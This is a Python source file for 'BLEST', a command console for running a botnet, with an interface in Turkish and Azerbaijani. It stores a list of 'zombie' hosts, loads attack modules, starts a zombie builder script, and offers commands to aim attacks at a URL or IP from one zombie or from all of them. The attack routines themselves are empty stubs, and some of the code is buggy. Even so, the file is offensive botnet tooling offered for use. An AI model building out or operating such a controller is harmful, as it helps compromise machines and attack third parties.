import os
import time
import subprocess
import sys
try:
    import colorama
    from colorama import Fore
except ImportError:
    sys.stdout.write(Fore.BLUE+'\r[X]'+Fore.RESET+f' BLEST Yükleniyor ... [{Fore.RED}HATA{Fore.RESET}]')
    sys.exit()
from colorama import Fore, Back, Style
import random
from sys import platform
total_botnet = 0
total_zombies = []
modules = []
modules_num = 0
loading_chars = []
typos = []
extensions = ['.py', '.rb', '.sh', '.pl', '.html']
mdl_options = []
root_path = "/root/.blest"
trash_path = "/usr/var/blest_trash"
log_path = None
colorama.init()
sys.stdout.write(Fore.BLUE+'[i]'+Fore.RESET+' Keş temizleniyor...')
for i in os.listdir("/root/.blest"):
    os.system('rm -rf /root/.blest/'+i)
time.sleep(0.5)
about = f'''
            BLEST HAKKINDA
========================================
> Yazan         : G00Dway, ¿¿ᏵꝊꝊ𐌃Ꮤ𐌀𐌙??
> Kredi         : Fux
> BLEST Dil     : Python, Bash
> BOTNET Dil    : Python, Ruby, Bash
> Tarafından    : BLEST BOYZ!

           SOSYAL MEDYAMIZ
========================================
> Discord       : {Fore.GREEN}https://discord.gg/NE7REnjs2p{Fore.RESET} 
'''



def attack_all(SERVER):
    pass


def attack_only(ZOMBIE, LINK):
    pass


def build_zombie():
    os.system('python3 /usr/share/BLEST/bots/build/start_build.py')




time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [-]')
try:
    if os.path.exists("/usr/share/BLEST/VERSION"):
        with open("/usr/share/BLEST/VERSION", "r") as f:
            version = f.read()
    else:
        sys.stdout.write(Fore.BLUE+'\r[X]'+Fore.RESET+f' BLEST Yükleniyor ... [{Fore.RED}HATA{Fore.RESET}]')
        print(Fore.RED+'[-]'+Fore.RESET+' Versiyon fayl tapılmadı')
        version = "???"
        sys.exit()
except:
    pass
time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [\]')
try:
    time.sleep(0.1)
    sys.stdout.write(Fore.BLUE + '\r[i]' + Fore.RESET + ' BLEST Yükleniyor ... [|]')
    if os.path.exists("/usr/share/BLEST/bots/zombies/zombies.txt"):
        with open("/usr/share/BLEST/bots/zombies/zombies.txt", "r") as z:
            for line in z:
                if z == '\n':
                    continue
                else:
                    total_zombies.append(line)
                    total_botnet += 1
    else:
        sys.stdout.write(Fore.BLUE+'\r[X]'+Fore.RESET+f' BLEST Yükleniyor ... [{Fore.RED}HATA{Fore.RESET}]')
        print(Fore.RED+'[-]'+Fore.RESET+' Zombiler bulunmadı!!!')
        os.system('touch /usr/share/BLEST/bots/zombies/zombies.txt')
        sys.exit()
    modl = os.listdir("/usr/share/BLEST/core/modules")
    sys.stdout.write(Fore.BLUE + '\r[i]' + Fore.RESET + ' BLEST Yükleniyor ... [/]')
    for m in modl:
        if m == 'init':
            continue
        if '.txt' in m or '.log' in m:
            continue
        if os.path.isdir("/usr/share/BLEST/core/modules/"+m):
            c = os.listdir("/usr/share/BLEST/core/modules/"+m)
            for j in c:
                if '.txt' in j or '.log' in j:
                    continue
                for ext in extensions:
                    if ext in j:
                        typos.append('modules/'+m+'/'+j)
                        j = j.replace(ext, "")
                modules.append('modules/'+m+'/'+j)
                modules_num+=1
        else:
            for ext in extensions:
                if ext in m:
                    typos.append('modules/'+m)
                    m = m.replace(ext, "")
            modules.append('modules/'+m)
            modules_num+=1
except:
    pass
time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [-]')
try:
    time.sleep(0.1)
    sys.stdout.write(Fore.BLUE + '\r[i]' + Fore.RESET + ' BLEST Yükleniyor ... [\]')
    if os.path.exists("/usr/share/BLEST/core/modules/init"):
        ini = os.listdir("/usr/share/BLEST/core/modules/init")
        for n in ini:
            if '.ini' in n:
                with open("/usr/share/BLEST/core/modules/init/"+n, "r") as sample:
                    for line in sample:
                        mdl_options.append(line)
            else:
                pass
except Exception as e:
    sys.stdout.write(Fore.BLUE+'\r[X]'+Fore.RESET+f' BLEST Yükleniyor ... [{Fore.RED}HATA{Fore.RESET}]')
    print(Fore.RED+e+Fore.RESET)
    try:
        sys.exit()
    except:
        exit()
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [|]')
time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [/]')
time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+' BLEST Yükleniyor ... [-]')
time.sleep(0.1)
sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+f' BLEST Yükleniyor ... [{Fore.GREEN}OK{Fore.RESET}]')
time.sleep(0.3)
os.system('clear')
help_modules = '''
BLEST Modül Yardım Menüsü
============================

    Emrler                          Hakkında
    ----------                      ------------
    use <modül>                     Belirtilen modülü seçin
    show options                    Modül seçeneklerini göster
    set <seçenek> <değer>           Belirtilen seçeneği belirtilen değere değiştirin
    back                            Ana çerçeveye geri dön
    run, start                      Başlat, Seçili modülü çalıştır
'''
help_botnet = '''
BLEST Botnet Yardım Menüsü
============================

    Emrler                           Hakkında
    ----------                       ------------
--> botnet start                     Botnet'i başlatın, Botnet menüsünü aç <--
    botnet check                     Tüm zombileri hatalar için yoklayın 
    zombies show                     Mevcut tüm zombileri göster
    zombies delete                   Mevcut tüm zombileri sil
    zombies del <zombi>              Yalnızca belirtilen zombini sil
    zombies add <zombi>              belirtilen zombini ekleyin
    zombies update                   Zombi listesini güncelle
'''
help_menu = f'''
BLEST Yardım Menüsü
=====================

    Emrler                          Hakkında
    ----------                      ------------
    help <arg>                      Bu menüyü göster, help üçün daha çox emrler: botnet, modules
    show <arg>                      Show üçün daha çox emrler: modules, options
    banner                          Banner'ı Göster
    clear                           Ekranı temizle
    about                           Blest hakkında
    update                          Güncellemelere bakın, indiki versiyon: {version}
    exit, quit                      Blest'ten çıkış et

{Fore.GREEN}Misal Yardım :{Fore.RESET} help botnet
{Fore.GREEN}Misal Botnet :{Fore.RESET} botnet start
{Fore.GREEN}Misal Emr    :{Fore.RESET} show modules
{Fore.GREEN}Misal Modül  :{Fore.RESET} use module/my/script
{Fore.GREEN}Misal Modül  :{Fore.RESET} show options
{Fore.GREEN}Misal Modül  :{Fore.RESET} set target 192.168.1.1
'''
try:
    if os.path.exists("/usr/share/BLEST/core"):
        pass
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Gerekli modüller tapılmadı, blest çıkış ediyor...')
        sys.exit()
except:
    exit()
def banner_etc():
    banners = ['''
       _____,,;;;`;         ;';;;,,_____
    ,~(  )  , )~~\|  BLEST  |/~~( ,  (  )~;
    ' / / --`--,               .--'-- \ \ `
     /  \    | '               ` |    /  \
''', '''
     ____.-.____
    [___________]
   (d|||||||||||b)
    `|||||||||||`
     |||||||||||
     |||||||||||
     |||||||||||
     |||||||||||
     `"""""""""`  blest/recycle/bin/sh
''', '''
   ________
   < blest >
   --------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *
''', '''
       (          (            
   (   )\ )       )\ )  *   )  
 ( )\ (()/(  (   (()/(` )  /(  
 )((_) /(_)) )\   /(_))( )(_)) 
((_)_ (_))  ((_) (_)) (_(_())  
 | _ )| |   | __|/ __||_   _|  
 | _ \| |__ | _| \__ \  | |    
 |___/|____||___||___/  |_|    
''', '''
__________.____     ___________ ____________________
\______   \    |    \_   _____//   _____/\__    ___/
 |    |  _/    |     |    __)_ \_____  \   |    |   
 |    |   \    |___  |        \/        \  |    |   
 |______  /_______ \/_______  /_______  /  |____|   
        \/        \/        \/        \/            
''', '''
______   _        _______  _______ _________
(  ___ \ ( \      (  ____ \(  ____ \\__   __/
| (   ) )| (      | (    \/| (    \/   ) (   
| (__/ / | |      | (__    | (_____    | |   
|  __ (  | |      |  __)   (_____  )   | |   
| (  \ \ | |      | (            ) |   | |   
| )___) )| (____/\| (____/\/\____) |   | |   
|/ \___/ (_______/(_______/\_______)   )_(   
''', '''
 _______   ___       _______   ________  ___________  
|   _  "\ |"  |     /"     "| /"       )("     _   ") 
(. |_)  :)||  |    (: ______)(:   \___/  )__/  \\__/  
|:     \/ |:  |     \/    |   \___  \       \\_ /     
(|  _  \\  \  |___  // ___)_   __/  \\      |.  |     
|: |_)  :)( \_|:  \(:      "| /" \   :)     \:  |     
(_______/  \_______)\_______)(_______/       \__|     
                                                      
''']
    banner_selected = random.choice(banners)
    banner = f'''
{banner_selected}
                                             
''''''-----------------={ BLEST By Blest Boyz }=-----------------'''f'''

+ -- --=[ {Fore.CYAN}BLEST Versiyon  {Fore.RESET}: {version}
- -- ---[ Total Zombiler  : {total_botnet}
- -- ---[ Total Modüller  : {modules_num}


> Yardım menüsünü göstermek için {Fore.GREEN}help{Fore.RESET} yazın
'''
    print(banner)


def main():
    banner_etc()
    try:
        blest = input('(\033[4mblest\033[0m) > ').strip(" ")
    except Exception:
        print()
        print(Fore.RED+'[-]'+Fore.RESET+' Blest cıkış ediyor...')
        sys.exit()
    blest = blest.split()
    while True:
        if blest == []:
            pass
        elif blest[0] == 'clear':
            os.system('clear')
        elif blest[0] == 'back':
            pass
        elif blest[0] == 'about':
            print(about)
        elif blest[0] == 'help' or blest[0] == '?':
            if len(blest) < 2:
                print(help_menu)
            else:
                try:
                    if blest[1] == 'botnet':
                        print(help_botnet)
                    elif blest[1] == 'modules':
                        print(help_modules)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Yardım için kullanılabilenler: (botnet, modules)')
                except:
                    pass
        elif blest[0] == 'exit' or blest[0] == 'quit':
            try:
                sys.exit()
            except:
                exit()
        elif blest[0] == 'use':
            if len(blest) < 2:
                print(Fore.RED+'[-]'+Fore.RESET+' Lütfen bir modül adı yazın')
            else:
                try:
                    mod = 0
                    if blest[1] in modules:
                        print(Fore.BLUE+'[i]'+Fore.RESET+' Modül yüklenir '+blest[1]+' ...')
                        for g in typos:
                            if blest[1] in g:
                                mod = typos.index(g)
                        os.system("python3 /usr/share/BLEST/data/"+typos[mod]+' '+blest[1]+' '+typos[mod])
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Modül tapılmadı: "'+blest[1]+'"')
                except:
                    pass
        elif blest[0] == 'botnet':
            if len(blest) < 2:
                print(Fore.RED+'[-]'+Fore.RESET+' Lütfen parameter yazın')
            else:
                try:
                    if blest[1] == 'start':
                        build_zombie()
                    elif blest[1] == 'check':
                        for line in total_zombies:
                            if '.' in line or 'http' in line or 'https' in line or '://' in line or 'ftp' in line or '/' in line:
                                print(Fore.YELLOW+'[+]'+Fore.RESET+f"'{line}' - Zombi'de hata yok")
                            else:
                                print(Fore.RED+'[-]'+Fore.RESET+f"'{line}' - Zombi'de hata var")
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Botnet için bilinmeyen emr: "'+blest[1]+'"')
                except:
                    pass
        elif blest[0] == 'net':
            if len(blest) < 3:
                print(Fore.RED+'[-]'+Fore.RESET+' Lütfen bir emr belirtin')
            else:
                try:
                    if blest[1] == 'attack':
                        if '.' in blest[2] or 'http' in blest[2] or 'https' in blest[2] or '://' in blest[2] or 'ftp' in blest[2] or '/' in blest[2]:
                            attack_all(blest[2])
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz URL/IP/DNS girildi')
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Net için bilinmeyen emr: "'+blest[1]+'"')
                except:
                    pass
        elif blest[0] == 'netonly':
            if len(blest) < 4:
                print(Fore.RED+'[-]'+Fore.RESET+' Lütfen EMR/zombi/URL belirtin')
            else:
                try:
                    if blest[1] == 'attack':
                        if blest[2] in total_zombies:
                            if '.' in blest[3] or 'http' in blest[3] or 'https' in blest[3] or '://' in blest[3] or 'ftp' in blest[3] or '/' in blest[3]:
                                attack_only(blest[2], blest[3])
                            else:
                                print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz URL/IP/DNS girildi')
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+f"'{blest[2]}' - Zombi listede değil!")
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Netonly için bilinmeyen emr: "'+blest[1]+'"')
                except:
                    pass
        elif blest[0] == 'zombies':
            if len(blest) < 2:
                print(Fore.RED+'[-]'+Fore.RESET+' Lütfen parameter yazın')
            else:
                try:
                    if blest[1] == 'show':
                        if total_zombies == [] or total_zombies == ['\n']:
                            print(Fore.RED+'[-]'+Fore.RESET+' Zombiler yok!')
                        else:
                            num = 0
                            print("----- Mevcut toplam zombi:")
                            print()
                            for zm in total_zombies:
                                num+=1
                                print(f'{num} -', zm)
                            print()
                    elif blest[1] == 'delete':
                        total_zombies.clear()
                        try:
                            os.system('rm -rf /usr/share/BLEST/bots/zombies/zombies.txt')
                            os.system('touch /usr/share/BLEST/bots/zombies/zombies.txt')
                        except:
                            pass
                        print(Fore.YELLOW+'[+]'+Fore.RESET+' Tüm zombiler başarıyla silindi')
                    elif blest[1] == 'del':
                        if len(blest) < 3:
                            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen zombi adını girin')
                        else:
                            try:
                                if blest[2] in total_zombies:
                                    total_zombies.remove(blest[2])
                                    os.system("rm -rf /usr/share/BLEST/bots/zombies/zombies.txt")
                                    os.system("touch /usr/share/BLEST/bots/zombies/zombies.txt")
                                    with open("/usr/share/BLEST/bots/zombies/zombies.txt", "a") as w:
                                        w.write('\n'.join(total_zombies))
                                    print(Fore.YELLOW+'[+]'+Fore.RESET+f"'{blest[2]}' - Zombi başarıyla silindi")
                                else:
                                    print(Fore.RED+'[-]'+Fore.RESET+f"'{blest[2]}' - Zombi bulunmadı")
                            except:
                                pass
                    elif blest[1] == 'add':
                        if len(blest) < 3:
                            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen zombi adını girin')
                        else:
                            try:
                                if blest[2] not in total_zombies:
                                    total_zombies.append(blest[2])
                                    with open("/usr/share/BLEST/bots/zombies/zombies.txt", "a") as add:
                                        add.write('\n'+blest[2])
                                    print(Fore.YELLOW+'[+]'+Fore.RESET+f"'{blest[2]}' - Zombi başarıyla eklendi")
                                else:
                                    print(Fore.RED+'[-]'+Fore.RESET+f"'{blest[2]}' - Zombi zaten listde")
                            except:
                                pass
                    elif blest[1] == 'update':
                        total_zombies.clear()
                        with open("/usr/share/BLEST/bots/zombies/zombies.txt", "r") as g:
                            for line in g:
                                line = line.rstrip('\n')
                                total_zombies.append(line)
                        print(Fore.YELLOW+'[+]'+Fore.RESET+' Zombiler güncellendi!')
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Lütfen geçerli emr girin')
                except:
                    pass
        elif blest[0] == 'show':
            if len(blest) < 2:
                print(Fore.RED+'[-]'+Fore.RESET+' Show için kullanılabilenler: (modules, options)')
            else:
                try:
                    if blest[1] == 'modules':
                        mdls = 0
                        for i in modules:
                            mdls+=1
                        num = 0
                        print(Fore.CYAN+f"> Modüller: {Fore.RESET}{mdls}")
                        print("------- Toplam kullanılabilir modüller:")
                        print()
                        for v in modules:
                            num+=1
                            print('- '+v)
                        print()
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Show için kullanılabilenler: (modules, options)')
                except:
                    pass
        elif blest[0] == 'banner':
            banner_etc()
        elif blest[0] == 'update':
            os.system('bash /usr/share/BLEST/update/blest_update.sh')
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' Emr bulunmadı: "'+blest[0]+'"')
        try:
            blest = input('(\033[4mblest\033[0m) > ').strip(" ")
        except Exception:
            print()
            print(Fore.RED+'[-]'+Fore.RESET+' Blest cıkış ediyor...')
            sys.exit()
        blest = blest.split()

        

if __name__ == "__main__":
    main()
